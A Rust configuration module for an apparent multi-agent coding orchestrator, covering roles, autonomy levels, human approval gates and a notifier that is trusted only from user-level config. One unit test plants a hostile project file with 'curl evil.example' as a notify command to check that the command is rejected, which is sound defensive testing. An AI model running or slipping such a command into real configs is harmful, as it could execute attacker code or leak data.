use crate::bus::MessageBudget;
use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};

/// User/project config. Project `spar.toml` field-overlays user config.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Config {
    #[serde(default = "default_max_agents")]
    pub max_agents: u32,
    #[serde(default)]
    pub default_backend: crate::cli::Backend,
    #[serde(default)]
    pub isolation: IsolationMode,
    #[serde(default)]
    pub providers: ProviderConfig,
    #[serde(default)]
    pub ship: ShipConfig,
    #[serde(default)]
    pub timeouts: TimeoutConfig,
    #[serde(default)]
    pub suite: SuiteConfig,
    /// Provider assignment by role. Priority 9 consumes it to key the fleet.
    #[serde(default)]
    pub roles: RolesConfig,
    /// Reviewer verdict / acceptance gate policy.
    #[serde(default)]
    pub review: ReviewConfig,
    /// Pre-coding acceptance tests (plan flow). Separate from suite channel.
    #[serde(default)]
    pub spec: SpecConfig,
    #[serde(default)]
    pub gates: GatesConfig,
    #[serde(default)]
    pub autonomy: AutonomyLevel,
    #[serde(default)]
    pub message_budget: MessageBudget,
    #[serde(default)]
    pub auto_cleanup: bool,
    #[serde(default)]
    pub model_select: ModelSelectConfig,
    /// Optional external `@human` notifier. Empty by default — the TUI alert panel
    /// is the always-on baseline; this is the operator's opt-in push sink.
    #[serde(default)]
    pub notify: NotifyConfig,
}

/// Operator-configured external sink for `@human` / `Blocked` alerts. spar ships no
/// notifier of its own; set exactly one of these to wire your own (ntfy, Slack, a
/// script). Neither set ⇒ only the TUI panel fires.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct NotifyConfig {
    /// Shell command spar runs on each alert (summary on `$1`, message JSON on stdin).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub command: Option<String>,
    /// URL spar POSTs the message JSON to on each alert.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub webhook: Option<String>,
}

/// vals-backed dynamic model selection (see DECISIONS MS*).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ModelSelectConfig {
    #[serde(default = "default_model_select_source")]
    pub source: String,
    #[serde(default = "default_model_select_benches")]
    pub benches: Vec<String>,
    /// Cache TTL seconds (default 24h).
    #[serde(default = "default_model_select_ttl")]
    pub cache_ttl_secs: u64,
    /// Provider allow patterns (`cli:*`, `api:openai`, `*`). Empty = all mappable.
    #[serde(default)]
    pub allow: Vec<String>,
    #[serde(default)]
    pub profiles: std::collections::HashMap<String, crate::model_select::ProfileWeights>,
    /// role name → benchmark-profile name (distinct from top-level `[roles]`, which
    /// assigns *providers*).
    #[serde(default)]
    pub role_profiles: std::collections::HashMap<String, String>,
    /// Auto-refresh a stale/missing vals cache during `--select` (default true). Set
    /// false to disable spar's network fetch: a stale cache is used as-is and a missing
    /// one errors instead of fetching. `spar model refresh` still works either way.
    #[serde(default = "default_model_select_auto_refresh")]
    pub auto_refresh: bool,
}

impl Default for ModelSelectConfig {
    fn default() -> Self {
        Self {
            source: default_model_select_source(),
            benches: default_model_select_benches(),
            cache_ttl_secs: default_model_select_ttl(),
            allow: Vec::new(),
            profiles: crate::model_select::default_profiles(),
            role_profiles: default_model_select_role_profiles(),
            auto_refresh: default_model_select_auto_refresh(),
        }
    }
}

impl ModelSelectConfig {
    pub fn resolved_profiles(
        &self,
    ) -> std::collections::HashMap<String, crate::model_select::ProfileWeights> {
        let mut m = crate::model_select::default_profiles();
        for (k, v) in &self.profiles {
            m.insert(k.clone(), v.clone());
        }
        m
    }

    pub fn role_profile(&self, role: &str) -> &str {
        self.role_profiles
            .get(role)
            .map(|s| s.as_str())
            .unwrap_or(match role {
                "planner" | "plan_critic" => "best",
                "tester" | "test_author" => "fast",
                "reviewer" => "value",
                _ => "value",
            })
    }

    pub fn min_accuracy_for(&self, profile: &str) -> Option<f64> {
        self.resolved_profiles()
            .get(profile)
            .and_then(|p| p.min_accuracy)
    }
}

fn default_model_select_source() -> String {
    "vals".into()
}

fn default_model_select_benches() -> Vec<String> {
    vec!["swebench".into()]
}

fn default_model_select_ttl() -> u64 {
    86400
}

fn default_model_select_auto_refresh() -> bool {
    true
}

fn default_model_select_role_profiles() -> std::collections::HashMap<String, String> {
    let mut m = std::collections::HashMap::new();
    m.insert("planner".into(), "best".into());
    m.insert("plan_critic".into(), "best".into());
    m.insert("implementer".into(), "value".into());
    m.insert("reviewer".into(), "value".into());
    m.insert("tester".into(), "fast".into());
    m.insert("test_author".into(), "fast".into());
    m
}

#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum IsolationMode {
    None,
    #[default]
    Worktree,
    #[serde(rename = "worktree+db")]
    WorktreeDb,
    #[serde(rename = "worktree+bwrap")]
    WorktreeBwrap,
}

/// How aggressively spar auto-passes human gates.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum AutonomyLevel {
    /// Require human at plan / winner / ship (safe default).
    #[default]
    Manual,
    /// Auto-approve plan; still gate winner + ship.
    Semi,
    /// Auto plan + winner; ship still requires confirm unless ship.auto_confirm.
    High,
    /// Auto plan + winner + ship.
    Full,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GatesConfig {
    /// Require plan approval gate (can be skipped by autonomy).
    #[serde(default = "default_true")]
    pub plan: bool,
    #[serde(default = "default_true")]
    pub winner: bool,
    #[serde(default = "default_true")]
    pub ship: bool,
}

impl Default for GatesConfig {
    fn default() -> Self {
        Self {
            plan: true,
            winner: true,
            ship: true,
        }
    }
}

fn default_true() -> bool {
    true
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct ProviderConfig {
    #[serde(default = "default_provider_order")]
    pub order: Vec<String>,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct ShipConfig {
    #[serde(default)]
    pub auto_confirm: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TimeoutConfig {
    #[serde(default = "default_slot_timeout_secs")]
    pub slot_secs: u64,
    /// Reviewer wall clock (diff-focused). Defaults to `slot_secs`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub review_secs: Option<u64>,
    /// Running slot with no log output for this long ⇒ `stalled` in status/TUI.
    /// `0` disables the stall flag (last_log_at still reported).
    #[serde(default = "default_stall_warn_secs")]
    pub stall_warn_secs: u64,
    #[serde(default = "default_wait_timeout")]
    pub wait: String,
}

impl Default for TimeoutConfig {
    fn default() -> Self {
        Self {
            slot_secs: default_slot_timeout_secs(),
            review_secs: None,
            stall_warn_secs: default_stall_warn_secs(),
            wait: default_wait_timeout(),
        }
    }
}

fn default_stall_warn_secs() -> u64 {
    300
}

impl TimeoutConfig {
    pub fn review_secs(&self) -> u64 {
        self.review_secs.unwrap_or(self.slot_secs)
    }
}

/// Dedicated full-suite channel (cheap/dumb model). Separate from smart review/impl.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SuiteConfig {
    #[serde(default = "default_true")]
    pub enabled: bool,
    #[serde(default = "default_suite_timeout_secs")]
    pub timeout_secs: u64,
}

impl Default for SuiteConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            timeout_secs: default_suite_timeout_secs(),
        }
    }
}

fn default_suite_timeout_secs() -> u64 {
    7200
}

/// Provider assignment by role (Priority 8). Values are `@model`-capable provider ref
/// strings validated by `ProviderRef::parse`. `reviewer` is a list (a review fleet); an
/// empty list is "unset". Distinct from `[model_select.role_profiles]`, which maps roles
/// to *benchmark profiles*, not providers. Keys are the canonical `SlotRole` config keys.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct RolesConfig {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub planner: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub plan_critic: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub implementer: Option<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub reviewer: Vec<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub tester: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub test_author: Option<String>,
}

impl RolesConfig {
    /// Priority 9 consumes this for the role-key invariant check.
    #[allow(dead_code)]
    pub fn is_empty(&self) -> bool {
        self.planner.is_none()
            && self.plan_critic.is_none()
            && self.implementer.is_none()
            && self.reviewer.is_empty()
            && self.tester.is_none()
            && self.test_author.is_none()
    }

    /// Validate every assigned ref through `ProviderRef::parse`, naming the offending
    /// role key on failure. Keeps `init_slot_model`'s `.expect()` unreachable from config.
    fn validate(&self) -> Result<()> {
        let singles = [
            ("planner", &self.planner),
            ("plan_critic", &self.plan_critic),
            ("implementer", &self.implementer),
            ("tester", &self.tester),
            ("test_author", &self.test_author),
        ];
        for (key, val) in singles {
            if let Some(v) = val {
                crate::provider_ref::ProviderRef::parse(v)
                    .with_context(|| format!("invalid provider in [roles].{key}: {v:?}"))?;
            }
        }
        for v in &self.reviewer {
            crate::provider_ref::ProviderRef::parse(v)
                .with_context(|| format!("invalid provider in [roles].reviewer: {v:?}"))?;
        }
        Ok(())
    }
}

#[derive(Debug, Clone, Default, Deserialize)]
struct RolesConfigFile {
    planner: Option<String>,
    plan_critic: Option<String>,
    implementer: Option<String>,
    reviewer: Option<Vec<String>>,
    tester: Option<String>,
    test_author: Option<String>,
}

/// Acceptance gate policy. Review *timeouts* stay at `[timeouts].review_secs`.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ReviewConfig {
    /// When true (default), an `unverified` acceptance criterion blocks the ship the
    /// same way a `fail` does. A criterion the reviewer never mentioned always blocks,
    /// regardless of this setting.
    #[serde(default = "default_true")]
    pub require_all_criteria: bool,
}

impl Default for ReviewConfig {
    fn default() -> Self {
        Self {
            require_all_criteria: true,
        }
    }
}

/// Pre-coding test-author channel (plan → before human gate).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SpecConfig {
    #[serde(default = "default_true")]
    pub enabled: bool,
    #[serde(default = "default_spec_timeout_secs")]
    pub timeout_secs: u64,
}

impl Default for SpecConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            timeout_secs: default_spec_timeout_secs(),
        }
    }
}

fn default_spec_timeout_secs() -> u64 {
    1800
}

fn default_max_agents() -> u32 {
    4
}

fn default_provider_order() -> Vec<String> {
    vec!["cli:claude".into(), "cli:grok".into(), "cli:agy".into()]
}

fn default_slot_timeout_secs() -> u64 {
    1800
}

fn default_wait_timeout() -> String {
    "2h".into()
}

impl Default for Config {
    fn default() -> Self {
        Self {
            max_agents: default_max_agents(),
            default_backend: crate::cli::Backend::Auto,
            isolation: IsolationMode::default(),
            providers: ProviderConfig {
                order: default_provider_order(),
            },
            ship: ShipConfig::default(),
            timeouts: TimeoutConfig::default(),
            suite: SuiteConfig::default(),
            roles: RolesConfig::default(),
            review: ReviewConfig::default(),
            spec: SpecConfig::default(),
            gates: GatesConfig::default(),
            autonomy: AutonomyLevel::default(),
            message_budget: MessageBudget::default(),
            auto_cleanup: false,
            model_select: ModelSelectConfig::default(),
            notify: NotifyConfig::default(),
        }
    }
}

impl Config {
    /// Whether plan approval can be auto-applied.
    pub fn auto_plan(&self) -> bool {
        !self.gates.plan
            || matches!(
                self.autonomy,
                AutonomyLevel::Semi | AutonomyLevel::High | AutonomyLevel::Full
            )
    }

    pub fn auto_winner(&self) -> bool {
        !self.gates.winner || matches!(self.autonomy, AutonomyLevel::High | AutonomyLevel::Full)
    }

    pub fn auto_ship(&self) -> bool {
        !self.gates.ship || self.ship.auto_confirm || matches!(self.autonomy, AutonomyLevel::Full)
    }
}

#[derive(Debug, Clone, Default, Deserialize)]
struct ConfigFile {
    max_agents: Option<u32>,
    default_backend: Option<crate::cli::Backend>,
    isolation: Option<IsolationMode>,
    providers: Option<ProviderConfigFile>,
    ship: Option<ShipConfigFile>,
    timeouts: Option<TimeoutConfigFile>,
    suite: Option<SuiteConfigFile>,
    roles: Option<RolesConfigFile>,
    review: Option<ReviewConfigFile>,
    spec: Option<SpecConfigFile>,
    gates: Option<GatesConfigFile>,
    autonomy: Option<AutonomyLevel>,
    message_budget: Option<MessageBudget>,
    auto_cleanup: Option<bool>,
    model_select: Option<ModelSelectConfigFile>,
    notify: Option<NotifyConfigFile>,
}

#[derive(Debug, Clone, Default, Deserialize)]
struct NotifyConfigFile {
    command: Option<String>,
    webhook: Option<String>,
}

#[derive(Debug, Clone, Default, Deserialize)]
struct ModelSelectConfigFile {
    source: Option<String>,
    benches: Option<Vec<String>>,
    cache_ttl_secs: Option<u64>,
    allow: Option<Vec<String>>,
    profiles: Option<std::collections::HashMap<String, crate::model_select::ProfileWeights>>,
    role_profiles: Option<std::collections::HashMap<String, String>>,
    auto_refresh: Option<bool>,
}

#[derive(Debug, Clone, Default, Deserialize)]
struct ProviderConfigFile {
    order: Option<Vec<String>>,
}

#[derive(Debug, Clone, Default, Deserialize)]
struct ShipConfigFile {
    auto_confirm: Option<bool>,
}

#[derive(Debug, Clone, Default, Deserialize)]
struct TimeoutConfigFile {
    slot_secs: Option<u64>,
    review_secs: Option<u64>,
    stall_warn_secs: Option<u64>,
    wait: Option<String>,
}

#[derive(Debug, Clone, Default, Deserialize)]
struct SuiteConfigFile {
    enabled: Option<bool>,
    timeout_secs: Option<u64>,
}

#[derive(Debug, Clone, Default, Deserialize)]
struct ReviewConfigFile {
    require_all_criteria: Option<bool>,
}

#[derive(Debug, Clone, Default, Deserialize)]
struct SpecConfigFile {
    enabled: Option<bool>,
    timeout_secs: Option<u64>,
}

#[derive(Debug, Clone, Default, Deserialize)]
struct GatesConfigFile {
    plan: Option<bool>,
    winner: Option<bool>,
    ship: Option<bool>,
}

impl Config {
    pub fn load(project_root: &Path) -> Result<Self> {
        let mut cfg = Self::default();
        if let Some(user_path) = user_config_path() {
            if user_path.is_file() {
                cfg.apply_file(&load_file(&user_path)?, Trust::User)?;
            }
        }
        let project_path = project_root.join("spar.toml");
        if project_path.is_file() {
            cfg.apply_file(&load_file(&project_path)?, Trust::Project)?;
        }
        Ok(cfg)
    }

    fn apply_file(&mut self, file: &ConfigFile, trust: Trust) -> Result<()> {
        if let Some(v) = file.max_agents {
            self.max_agents = v;
        }
        if let Some(v) = file.default_backend {
            self.default_backend = v;
        }
        if let Some(v) = file.isolation {
            self.isolation = v;
        }
        if let Some(p) = &file.providers {
            if let Some(order) = &p.order {
                self.providers.order = order.clone();
            }
        }
        if let Some(s) = &file.ship {
            if let Some(v) = s.auto_confirm {
                self.ship.auto_confirm = v;
            }
        }
        if let Some(t) = &file.timeouts {
            if let Some(v) = t.slot_secs {
                self.timeouts.slot_secs = v;
            }
            if let Some(v) = t.review_secs {
                self.timeouts.review_secs = Some(v);
            }
            if let Some(v) = t.stall_warn_secs {
                self.timeouts.stall_warn_secs = v;
            }
            if let Some(v) = &t.wait {
                self.timeouts.wait = v.clone();
            }
        }
        if let Some(s) = &file.suite {
            if let Some(v) = s.enabled {
                self.suite.enabled = v;
            }
            if let Some(v) = s.timeout_secs {
                self.suite.timeout_secs = v;
            }
        }
        if let Some(r) = &file.roles {
            if let Some(v) = &r.planner {
                self.roles.planner = Some(v.clone());
            }
            if let Some(v) = &r.plan_critic {
                self.roles.plan_critic = Some(v.clone());
            }
            if let Some(v) = &r.implementer {
                self.roles.implementer = Some(v.clone());
            }
            if let Some(v) = &r.reviewer {
                self.roles.reviewer = v.clone();
            }
            if let Some(v) = &r.tester {
                self.roles.tester = Some(v.clone());
            }
            if let Some(v) = &r.test_author {
                self.roles.test_author = Some(v.clone());
            }
            self.roles.validate()?;
        }
        if let Some(r) = &file.review {
            if let Some(v) = r.require_all_criteria {
                self.review.require_all_criteria = v;
            }
        }
        if let Some(s) = &file.spec {
            if let Some(v) = s.enabled {
                self.spec.enabled = v;
            }
            if let Some(v) = s.timeout_secs {
                self.spec.timeout_secs = v;
            }
        }
        if let Some(g) = &file.gates {
            if let Some(v) = g.plan {
                self.gates.plan = v;
            }
            if let Some(v) = g.winner {
                self.gates.winner = v;
            }
            if let Some(v) = g.ship {
                self.gates.ship = v;
            }
        }
        if let Some(v) = file.autonomy {
            self.autonomy = v;
        }
        if let Some(v) = file.message_budget {
            self.message_budget = v;
        }
        if let Some(v) = file.auto_cleanup {
            self.auto_cleanup = v;
        }
        if let Some(ms) = &file.model_select {
            if let Some(v) = &ms.source {
                self.model_select.source = v.clone();
            }
            if let Some(v) = &ms.benches {
                self.model_select.benches = v.clone();
            }
            if let Some(v) = ms.cache_ttl_secs {
                self.model_select.cache_ttl_secs = v;
            }
            if let Some(v) = &ms.allow {
                self.model_select.allow = v.clone();
            }
            if let Some(v) = &ms.profiles {
                for (k, prof) in v {
                    self.model_select.profiles.insert(k.clone(), prof.clone());
                }
            }
            if let Some(v) = &ms.role_profiles {
                for (k, role) in v {
                    self.model_select
                        .role_profiles
                        .insert(k.clone(), role.clone());
                }
            }
            if let Some(v) = ms.auto_refresh {
                self.model_select.auto_refresh = v;
            }
        }
        // [notify] shells out / makes outbound requests, so an untrusted project
        // spar.toml must not supply it — a cloned repo could otherwise run arbitrary
        // commands or exfiltrate message bodies the first time an alert fires. Only
        // the user-level config is trusted for this section.
        if trust == Trust::User {
            if let Some(n) = &file.notify {
                if let Some(v) = &n.command {
                    self.notify.command = Some(v.clone());
                }
                if let Some(v) = &n.webhook {
                    self.notify.webhook = Some(v.clone());
                }
            }
        }
        Ok(())
    }
}

/// Whether a config file is trusted to supply security-sensitive sections like
/// `[notify]`. The user-level config is trusted; a repo-local `spar.toml` is not.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Trust {
    User,
    Project,
}

fn user_config_path() -> Option<PathBuf> {
    dirs::config_dir().map(|d| d.join("spar").join("config.toml"))
}

fn load_file(path: &Path) -> Result<ConfigFile> {
    let text =
        std::fs::read_to_string(path).with_context(|| format!("read config {}", path.display()))?;
    if text.trim().is_empty() {
        return Ok(ConfigFile::default());
    }
    toml::from_str(&text).with_context(|| format!("parse config {}", path.display()))
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::tempdir;

    #[test]
    fn partial_project_overlays_user() {
        let tmp = tempdir().unwrap();
        let project = tmp.path();
        std::fs::write(
            project.join("spar.toml"),
            "max_agents = 2\nautonomy = \"high\"\n",
        )
        .unwrap();
        let cfg = Config::load(project).unwrap();
        assert_eq!(cfg.max_agents, 2);
        assert_eq!(cfg.providers.order, default_provider_order());
        assert!(!cfg.ship.auto_confirm);
        assert_eq!(cfg.autonomy, AutonomyLevel::High);
        assert!(cfg.auto_plan());
        assert!(cfg.auto_winner());
        assert!(cfg.suite.enabled);
        assert_eq!(cfg.suite.timeout_secs, 7200);
        assert!(cfg.spec.enabled);
        assert_eq!(cfg.spec.timeout_secs, 1800);
    }

    #[test]
    fn suite_and_review_timeout_overlay() {
        let tmp = tempdir().unwrap();
        let project = tmp.path();
        std::fs::write(
            project.join("spar.toml"),
            r#"
[timeouts]
slot_secs = 100
review_secs = 200

[suite]
enabled = false
timeout_secs = 3600

[spec]
enabled = false
timeout_secs = 900

[roles]
tester = "cli:grok"
test_author = "cli:agy"
"#,
        )
        .unwrap();
        let cfg = Config::load(project).unwrap();
        assert_eq!(cfg.timeouts.slot_secs, 100);
        assert_eq!(cfg.timeouts.review_secs(), 200);
        assert!(!cfg.suite.enabled);
        assert_eq!(cfg.suite.timeout_secs, 3600);
        assert!(!cfg.spec.enabled);
        assert_eq!(cfg.spec.timeout_secs, 900);
        assert_eq!(cfg.roles.tester.as_deref(), Some("cli:grok"));
        assert_eq!(cfg.roles.test_author.as_deref(), Some("cli:agy"));
    }

    #[test]
    fn roles_block_overlays() {
        let tmp = tempdir().unwrap();
        let project = tmp.path();
        std::fs::write(
            project.join("spar.toml"),
            r#"
[roles]
planner = "cli:claude"
plan_critic = "cli:grok"
implementer = "cli:codex@anthropic/claude-opus-4.5"
reviewer = ["cli:grok", "cli:agy", "cli:claude"]
tester = "cli:agy"
test_author = "cli:grok"
"#,
        )
        .unwrap();
        let cfg = Config::load(project).unwrap();
        assert_eq!(cfg.roles.planner.as_deref(), Some("cli:claude"));
        assert_eq!(cfg.roles.plan_critic.as_deref(), Some("cli:grok"));
        assert_eq!(
            cfg.roles.implementer.as_deref(),
            Some("cli:codex@anthropic/claude-opus-4.5")
        );
        assert_eq!(
            cfg.roles.reviewer,
            vec!["cli:grok", "cli:agy", "cli:claude"]
        );
        assert_eq!(cfg.roles.tester.as_deref(), Some("cli:agy"));
        assert_eq!(cfg.roles.test_author.as_deref(), Some("cli:grok"));
        assert!(!cfg.roles.is_empty());
    }

    #[test]
    fn roles_default_is_empty() {
        assert!(Config::default().roles.is_empty());
    }

    #[test]
    fn roles_reject_bad_ref() {
        let tmp = tempdir().unwrap();
        let project = tmp.path();
        std::fs::write(
            project.join("spar.toml"),
            "[roles]\nimplementer = \"claude\"\n",
        )
        .unwrap();
        let err = Config::load(project).unwrap_err();
        let msg = format!("{err:#}");
        assert!(
            msg.contains("implementer"),
            "error must name the role key, got: {msg}"
        );
    }

    #[test]
    fn roles_accept_model_ref() {
        let tmp = tempdir().unwrap();
        let project = tmp.path();
        std::fs::write(
            project.join("spar.toml"),
            "[roles]\nimplementer = \"cli:codex@openai/gpt-4o-mini\"\n",
        )
        .unwrap();
        let cfg = Config::load(project).unwrap();
        assert_eq!(
            cfg.roles.implementer.as_deref(),
            Some("cli:codex@openai/gpt-4o-mini")
        );
    }

    #[test]
    fn role_profiles_renamed() {
        let tmp = tempdir().unwrap();
        let project = tmp.path();
        std::fs::write(
            project.join("spar.toml"),
            r#"
[model_select.role_profiles]
planner = "value"

[model_select.roles]
planner = "best"
"#,
        )
        .unwrap();
        let cfg = Config::load(project).unwrap();
        assert_eq!(
            cfg.model_select
                .role_profiles
                .get("planner")
                .map(|s| s.as_str()),
            Some("value"),
            "the new role_profiles key overlays"
        );
        assert_eq!(
            cfg.model_select.role_profile("planner"),
            "value",
            "old [model_select.roles] key is ignored, no shim"
        );
    }

    #[test]
    fn review_config_defaults_to_strict() {
        assert!(Config::default().review.require_all_criteria);
    }

    #[test]
    fn review_config_overlay() {
        let tmp = tempdir().unwrap();
        let project = tmp.path();
        std::fs::write(
            project.join("spar.toml"),
            "[review]\nrequire_all_criteria = false\n",
        )
        .unwrap();
        let cfg = Config::load(project).unwrap();
        assert!(!cfg.review.require_all_criteria);
    }

    #[test]
    fn project_config_cannot_supply_notify() {
        let tmp = tempdir().unwrap();
        let project = tmp.path();
        std::fs::write(
            project.join("spar.toml"),
            "[notify]\ncommand = \"curl evil.example\"\nwebhook = \"http://evil.example\"\n",
        )
        .unwrap();
        let cfg = Config::load(project).unwrap();
        assert!(
            cfg.notify.command.is_none(),
            "project spar.toml must not set notify.command"
        );
        assert!(
            cfg.notify.webhook.is_none(),
            "project spar.toml must not set notify.webhook"
        );
    }

    #[test]
    fn user_config_supplies_notify() {
        let mut cfg = Config::default();
        let file: ConfigFile = toml::from_str(
            "[notify]\ncommand = \"ntfy publish\"\nwebhook = \"http://hooks.example\"\n",
        )
        .unwrap();
        cfg.apply_file(&file, Trust::User).unwrap();
        assert_eq!(cfg.notify.command.as_deref(), Some("ntfy publish"));
        assert_eq!(cfg.notify.webhook.as_deref(), Some("http://hooks.example"));
    }
}
